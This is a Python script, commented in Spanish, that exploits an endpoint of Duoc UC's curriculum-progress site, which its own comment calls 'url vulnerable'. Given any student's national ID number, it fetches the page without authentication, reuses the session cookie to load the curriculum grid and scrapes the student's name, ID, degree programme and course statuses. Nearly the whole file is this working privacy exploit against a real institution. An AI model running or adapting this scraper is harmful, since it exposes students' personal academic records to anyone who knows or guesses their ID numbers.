#!/usr/bin/python3
#coding: utf-8

import requests, re, sys
from bs4 import BeautifulSoup
from time import sleep


if len(sys.argv) != 2:
    print("\n [!] Uso de la aplicación: \n python3 get-ramos.py <rut sin dígito verificador> [!] \n")
    print("\n [·] Ejemplo: python3 get-ramos.py 23902132 [·] \n")
    sys.exit(1)


url_1 = "https://www2.duoc.cl/avance_curricular/plan?rut=" # <- url vulnerable


def get_pag(rut): # <- obtiene la pag en formato HTML de donde se saca todos los datos

    #page = requets.get(url_1 + rut, verify=False) <- descomentar esta línea si da error del certificado

    request_page = requests.get(url_1 + rut) # <- comentar esta línea si descomentas la línea de arriba

    page = BeautifulSoup(request_page.content, 'html.parser')

    return page, request_page.cookies # <- retorno de la pag en formato 'html' y además las cookies

def get_carrera(page): # <- obtiene la carrera que estudia el estudiante

    carrera = page.find('div', class_="carrera")

    carrera = str(carrera)

    carrera = carrera.split()

    carrera = carrera[1:4]

    carrera = ' '.join(map(str, carrera))

    carrera = re.findall("[A-Z]\w*", carrera)

    return carrera

def get_malla(pag, rut):

    cod = pag.find('div', class_="cod")
    cod = re.findall("\d{1,100}", str(cod))[0]

    page_malla = requests.get("https://www2.duoc.cl/avance_curricular/malla?codplan={}&rut={}".format(cod, rut)
                        ,cookies=get_pag(rut)[1]) # <- acá usamos la cookie

    page = BeautifulSoup(page_malla.content, 'html.parser')

    return page

def get_student_data(pag): # <- obtiene los datos del estudiante

    #Student Name

    student_name = pag.find('div', class_="name")
    student_name = re.findall("[A-Z]\w*", str(student_name))
    student_name.remove("Nombre")
    student_name = ' '.join(map(str, student_name))

    #End Student Name

    #Student rut

    student_rut = pag.find('div', class_="rut")
    student_rut = re.findall("[0-9~@#\^\$&\*\(\)-\.\?\d]*", str(student_rut))
    student_rut = ' '.join(map(str, student_rut))
    student_rut = student_rut.replace(' ', '')

    #End Student rut

    # Student Malla base

    student_malla = pag.find('div', class_="malla-general")
    student_malla = pag.find('div', class_="malla-general")
    student_malla = pag.findAll('script')

    #End Student Malla base
    return student_name, student_rut, student_malla

def ramos(data): # <- obtiene lo ramos del estudiante

    ramo = ""
    status = ""
    index = 0
    d_list = []
    ramos = []
    for i in range(len(data)):
        d_list.append(str(data[i]))


    for i in range(len(d_list)):

        ramoStart = d_list[i].find('Nombre')
        ramoEnd = d_list[i].find(',"Sigla"')

        statusStart = d_list[i].find('Estado')
        statusEnd = d_list[i].find(',"Nota Final')

        if ramoEnd != -1 and statusEnd != -1:
            ramo = "{} {}".format(d_list[i][ramoStart:ramoEnd], d_list[i][statusStart:statusEnd])
            ramos.append("{}".format(ramo))

        else:
            ramoEnd = d_list[i].find(',"Cr')
            if ramoEnd == -1 or statusEnd == -1:
                ramoEnd = d_list[i].find(',"Tipo')
                # statusEnd = d_list[i].find(',"Cant. Reprobadas"')

            ramo = "{} {}".format(d_list[i][ramoStart:ramoEnd], d_list[i][statusStart:statusEnd])
            ramos.append("{}".format(ramo))


    for i in range(0, 3):
        ramos.pop(i)
    ramos.pop(0)

    for i in range(len(ramos)):
        temp = ramos[i]
        temp = re.findall("(\[(?:\[??[^\[]*?\]))", temp)
        temp = ' '.join(map(str, temp))
        ramos[i] = temp


    for i in range(len(ramos)):
        if 'Anulado' in ramos[i]:
            index = i
    ramos.pop(index)

    for i in range(len(ramos)):
        if "OPTATIVOS" in ramos[i]:
            index = i
    ramos.pop(index)

    return ramos


if __name__=='__main__':

    rut = sys.argv[1]
    page = get_pag(rut)[0]
    carrera = get_carrera(page)
    data = get_student_data(get_malla(page,rut))[2]
    ramos = ramos(data)

    print('\n'.join(map(str, ramos)))

    # if carrera == []:
        # print("\n [!] Almuno no regular en Duoc UC [!] \n")
    # else:
        # carrera = ' '.join(map(str, carrera))

        # print("\n [*] {} [*] \n".format(get_student_data(get_malla(page, rut))[0])) # Name

        # print("\n [*] {} [*] \n".format(get_student_data(get_malla(page, rut))[1])) # Rut

        # print("\n [*] {} [*] \n ".format(carrera)) # Carrera

        # print('\n'.join(map(str,ramos))) 



